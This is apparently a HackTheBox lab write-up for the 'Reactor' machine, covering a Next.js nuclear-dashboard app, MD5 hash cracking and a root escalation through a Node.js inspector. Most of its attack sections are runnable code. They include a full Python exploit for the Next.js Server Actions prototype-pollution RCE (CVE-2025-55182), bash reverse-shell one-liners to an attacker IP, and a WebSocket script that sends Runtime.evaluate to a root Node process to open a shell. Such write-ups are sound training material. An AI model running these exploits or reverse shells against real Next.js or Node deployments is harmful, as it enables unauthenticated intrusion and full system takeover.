---
title: "HTB - Reactor"
date: 2026-05-24
tags: ["HackTheBox", "Linux", "Next.js", "RCE", "NodeInspector"]
categories: ["Machines&Challenges"]
difficulty: "Easy"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/Reactor.png"
---
**Difficulty:** Easy | **OS:** Linux

---

## Logo & Name Analysis - First Impressions

Before touching a single tool, the machine logo and name already give away a significant amount of information to an experienced player.

### The Logo

The machine logo shows a nuclear reactor facility - cooling towers with radiation symbols (☢), smoke/steam rising, set inside a green circle. On HackTheBox, machine logos almost always hint directly at the technology or theme involved.

**What the logo tells us immediately:**

- Nuclear reactor theme → the web app will be a reactor monitoring dashboard, ICS/SCADA-style interface with sensor readings, logs, and personnel panels
- Green color scheme → "nominal / online" status indicators - a live running service dashboard
- Radiation symbols → nuclear operations terminology ahead: coolant flow, pressure, neutron flux, core temperature - all realistic dashboard labels that give no obvious attack surface

### The Name

"Reactor" combined with the logo points toward two things at once:

- **React/Next.js** - "Reactor" is almost certainly a pun on React, the JavaScript framework. HTB machine names frequently reference the intended technology this way. This immediately narrows the attack surface to a Node.js web application.
- **Nuclear monitoring theme** - the app will look like a static read-only dashboard with no login, no forms, no visible input - pushing the attacker toward framework-level vulnerabilities rather than application logic.

### The Instant Hypothesis

Combining name + logo before even running nmap:

> *"This is a Next.js app themed as a nuclear reactor dashboard. The name 'Reactor' punning on React strongly suggests a Next.js vulnerability is the intended path. The dashboard will look static but the attack vector will be server-side - likely Server Actions, API routes, or RSC deserialization."*

This hypothesis was confirmed within minutes:

- Port 3000 → `X-Powered-By: Next.js` in response headers
- No login page, no visible forms → the framework itself is the attack surface, not the application logic
- Next.js Server Actions prototype pollution (CVE-2025-55182) → exact match

This is why reading the logo matters. A good HTB player can often narrow the entire attack path to 1-2 CVEs before the nmap scan finishes.

<!--more-->

---

## Summary

Reactor is a Linux machine running a Next.js 15 nuclear reactor monitoring dashboard. Initial access is achieved by exploiting a prototype pollution vulnerability in Next.js Server Actions (CVE-2025-55182) that allows unauthenticated Remote Code Execution. Lateral movement is accomplished by cracking MD5 password hashes found in a SQLite database. Privilege escalation to root abuses a Node.js `--inspect` debugger exposed on localhost by the uptime-monitor service, accessed via SSH port forwarding and a WebSocket payload.

---

## Reconnaissance

### Nmap

```bash
nmap -sCV <MACHINE_IP>
```

Open ports:

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 9.6p1 Ubuntu |
| 3000 | HTTP    | Next.js 15.0.3 |

The web server on port 3000 immediately reveals `X-Powered-By: Next.js` headers.

### Web Enumeration

Browsing to `http://reactor.htb:3000` shows ReactorWatch, a nuclear reactor core monitoring dashboard. The page is a static-looking Next.js App Router application displaying sensor readings, system logs, and on-site personnel.

Key observations from the HTML source:

- Build ID: `L3bimJe_3LvBcFWAnK5L4`
- Pure App Router (no Pages Router routes)
- No login page or visible user input

Fetching the build manifest confirmed only `/_app` and `/_error` as pages - the attack surface appeared minimal. All JS chunks were React internals with no application-specific routes or API endpoints visible.

---

## Initial Access - Next.js Server Actions RCE

### Vulnerability

Next.js Server Actions with the `Next-Action` header accept multipart form data that is deserialized using React's RSC (React Server Components) protocol. Due to insufficient validation, it is possible to craft a malicious payload that exploits prototype pollution to inject arbitrary JavaScript into the deserialization process, achieving unauthenticated Remote Code Execution on the server.

This is exploited by sending a specially crafted `__proto__` pollution chain via multipart POST with the `Next-Action: x` header. The `_prefix` field is evaluated as JavaScript during deserialization, and `process.mainModule.require('child_process')` is available in the Node.js context.

Reference: https://github.com/msanft/CVE-2025-55182

### Exploit

```python
# exploit.py
# /// script
# dependencies = ["requests"]
# ///
import requests
import sys
import json

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
print(res.status_code)
print(res.text)
```

### Testing RCE

```bash
python3 exploit.py http://reactor.htb:3000 "id"
```

Response:

```
1:E{"digest":"uid=999(node) gid=988(node) groups=988(node)"}
```

RCE confirmed as user `node`. The command output is returned in the `digest` field of the error response.

### Reverse Shell

```bash
# Start listener
nc -lvnp 4444

# Send reverse shell
python3 exploit.py http://reactor.htb:3000 "bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'"
```

Shell obtained as `node` inside `/opt/reactor-app`.

---

## Lateral Movement - node → engineer

### SQLite Database

Inside `/opt/reactor-app/` a SQLite database `reactor.db` was found:

```bash
strings /opt/reactor-app/reactor.db
```

Extracted credentials:

| Username | Hash (MD5) | Role |
|----------|------------|------|
| engineer | `39d97110eafe2a9a68639812cd271e8e` | operator |
| admin    | `a203b22191d744a4e70ada5c101b17b8` | administrator |

A `.env` file also revealed API keys and configuration:

```
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
DB_PATH=/opt/reactor-app/reactor.db
NODE_ENV=production
```

### Cracking Hashes

```bash
echo "39d97110eafe2a9a68639812cd271e8e" > hashes.txt
echo "a203b22191d744a4e70ada5c101b17b8" >> hashes.txt

john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Result: `reactor1` cracked for engineer's hash (admin hash did not crack).

### SSH Login

```bash
ssh engineer@reactor.htb
# password: reactor1
```

User flag:

```
cat ~/user.txt
6f88793779d462b6774408e5f020da5b
```

---

## Privilege Escalation - engineer → root

### Enumeration

```bash
id
# uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
```

Engineer is in the `lxd` group, but LXD was not properly initialized - the snap installer hung trying to reach the internet, making that path unavailable.

### Discovering the Uptime Monitor Service

Checking running processes revealed the real escalation path:

```bash
ps aux | grep node
# /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Confirming with systemd:

```bash
systemctl status uptime-monitor --no-pager
systemctl cat uptime-monitor
```

Service definition:

```ini
[Service]
Type=simple
User=root
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
Restart=on-failure
```

The service runs as root and starts the Node.js process with `--inspect=127.0.0.1:9229`. This flag enables the V8 Inspector Protocol - a debug WebSocket that accepts `Runtime.evaluate` calls, allowing arbitrary JavaScript execution inside the root process.

The worker itself (`/opt/uptime-monitor/worker.js`) is a simple HTTP health checker that probes the reactor app every 30 seconds and logs results to `/var/log/uptime-monitor.csv`. It is harmless on its own, but the exposed inspector is the vulnerability.

### Confirming the Listening Port

```bash
ss -tlnp
# 127.0.0.1:9229   LISTEN
```

The inspector is bound to localhost only - SSH port forwarding is required to reach it from the attack machine.

### SSH Port Forwarding

```bash
sshpass -p 'reactor1' ssh -N -L 9229:127.0.0.1:9229 engineer@reactor.htb
```

Confirm the inspector target is reachable:

```bash
curl -sS http://127.0.0.1:9229/json/list
```

Response:

```json
[{
  "description": "node.js instance",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/77ae3151-52de-47ab-8b08-a6de3be40ded",
  ...
}]
```

### Option A - Chrome DevTools (GUI)

Open Chrome/Chromium and navigate to `chrome://inspect`. Click Configure, add `localhost:9229`, then click inspect on the node process. In the DevTools console run:

```javascript
process.mainModule
  .require("child_process")
  .execSync("id; cp /root/root.txt /tmp/root.txt; chmod 644 /tmp/root.txt")
  .toString()
```

Output:

```
uid=0(root) gid=0(root) groups=0(root)
```

Then read the flag:

```bash
sshpass -p 'reactor1' ssh engineer@reactor.htb 'cat /tmp/root.txt'
```

### Option B - WebSocket Script (No GUI)

```python
# inspector_rce.py
import websocket, json, requests

r = requests.get('http://127.0.0.1:9229/json').json()
ws_url = r[0]['webSocketDebuggerUrl']
print(f"[+] Connecting to {ws_url}")

ws = websocket.create_connection(ws_url)
payload = {
    "id": 1,
    "method": "Runtime.evaluate",
    "params": {
        "expression": "process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/<YOUR_IP>/5555 0>&1\"')"
    }
}
ws.send(json.dumps(payload))
print("[+] Payload sent!")
print(ws.recv())
ws.close()
```

> **Important:** `require` is not defined in the inspector REPL context. Always use `process.mainModule.require` instead.

```bash
# Start listener
nc -lvnp 5555

# Fire the script
python3 inspector_rce.py
```

Root shell obtained.

```bash
cat /root/root.txt
```

---

## Attack Chain

```
Logo/Name Analysis
──────────────────
"Reactor" = React pun → Next.js app
Nuclear logo → static dashboard, framework is the target
         │
         ▼
Unauthenticated RCE              Credential Reuse           Node Inspector Abuse
───────────────────              ────────────────           ────────────────────
Next.js Server Actions  ──►  SQLite DB (reactor.db)  ──►  --inspect=127.0.0.1:9229
Prototype Pollution          MD5 hash cracked               systemd service as root
(Next-Action: x header)      password: reactor1             SSH -L 9229 forward +
                                                            WebSocket Runtime.evaluate

node (uid=999)          ──►  engineer (uid=1000)     ──►   root (uid=0)
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service detection |
| `curl` | Manual HTTP probing and inspector verification |
| `python3 requests` | Next.js Server Actions exploit delivery |
| `john` | MD5 hash cracking |
| `ssh -L` | Local port forwarding to reach Node inspector |
| `python3 websocket-client` | Node inspector WebSocket RCE |
| `nc` | Reverse shell listener |
| `sshpass` | Non-interactive SSH for port forwarding |
| `chrome://inspect` | GUI alternative for inspector exploitation |

---

## Key Takeaways

- **Read the logo and name first.** On HTB, the machine name is often a direct pun on the technology. "Reactor" → React → Next.js. This alone can tell you which CVEs to research before scanning.

- **Next.js Server Actions** deserialize multipart POST data via the RSC protocol. Without proper input validation, prototype pollution leads to arbitrary code execution - even with no visible forms or login pages on the app.

- **SQLite databases** in web app directories frequently contain plaintext or weakly hashed credentials worth extracting.

- **Node.js `--inspect`** bound to localhost is a critical misconfiguration when users have SSH access. The V8 Inspector Protocol exposes a `Runtime.evaluate` WebSocket method that executes arbitrary JavaScript in the target process.

- **`process.mainModule.require`** must be used instead of `require` when injecting code via the Node.js inspector, as `require` is not available in the inspector's REPL context.
